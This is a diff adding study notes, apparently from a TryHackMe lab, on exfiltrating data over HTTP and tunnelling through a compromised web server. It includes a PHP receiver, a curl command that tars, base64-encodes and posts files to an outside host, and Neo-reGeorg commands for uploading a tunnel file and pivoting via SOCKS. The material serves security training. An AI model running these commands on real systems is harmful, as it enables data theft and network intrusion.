@@ -91,3 +91,79 @@ tar cf - task5/ | ssh user@jump.example.com "cd /tmp/; tar xpf -"
 10.10.198.13 - - [22/Apr/2022:12:03:25 +0100] "POST /example.php HTTP/1.1" 200 147 "-" "curl/7.68.0"
 ```
 
+* We prefer HTTPS but can use either HTTPS or HTTP for data exfiltration
+* We will need a php page that handles the post requests on our attack or exfil machine
+
+#### Steps to exfil data
+
+* Set up a webserver on your attack machine with a .php page&#x20;
+* The C2 agent or attacker sends the data to the page using the `curl` command&#x20;
+* The webserver will recieve the data and store it&#x20;
+* We will use `contact.php` for our web server and store the files collected in the `/tmp` folder&#x20;
+
+#### php file&#x20;
+
+```
+<?php 
+if (isset($_POST['file'])) {
+        $file = fopen("/tmp/http.bs64","w");
+        fwrite($file, $_POST['file']);
+        fclose($file);
+   }
+?>
+```
+
+* run the apache2 server&#x20;
+
+```
+sudo systemctl start apache2
+```
+
+#### Exfil the files&#x20;
+
+```
+curl --data "file=$(tar zcf - task6 | base64)" http://web.example.com/contact.php
+```
+
+* The base64 recieved will be broken due to the url encdoding over the HTTP.
+* The + symbol has been replaced with ' ' (spaces)
+* Can easily be fixed with the sed command&#x20;
+
+```
+sudo sed -i 's/ /+/g' /tmp/http.bs64
+#now decode it 
+cat /tmp/http.bs64 | base64 -d | tar xvfz -
+```
+
+### HTTP Tunneling&#x20;
+
+* Tunneling over the HTTP protocol technique encapsulates other protocols and sends them back and forth via HTTP
+* This is useful when certain hosts are not able to reach the internet&#x20;
+
+![HTTP Tunneling](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/92004a7c6a572f9680f0056b9aa88baa.png)
+
+* For HTTP Tunneling, we will be using a [Neo-reGeorg](https://github.com/L-codes/Neo-reGeorg) tool to establish a communication channel to access the internal network devices.
+* Now lets generate an encrypted client file to upload it to the victim web server&#x20;
+
+```
+python3 neoreg.py generate -k my_key  
+```
+
+* `-k` is the key for the file so in the real world make it strong&#x20;
+* The previous command generates encrypted Tunneling clients with `my_key` key in the `neoreg_servers/` directory. Note that there are various extensions available, including PHP, ASPX, JSP, etc.
+* We will be using `tunnel.php`
+* Upload the `tunnel.php` file to the victim web server&#x20;
+* Now lets connect to the neo from our attack machine that we just uploaded&#x20;
+
+```
+python3 neoreg.py -k my_key -u http://MACHINE_IP/uploader/files/tunnel.php
+```
+
+* Once you connect we are ready to use the tunnel connection as a proxy on out local machine `127.0.0.1:1080` in the real world change the port to something random&#x20;
+* Now we can tunnel further into the network&#x20;
+* To curl with socks we can do what is below&#x20;
+
+```
+curl --socks5 127.0.0.1:1080 http://172.20.0.121:80
+```
+
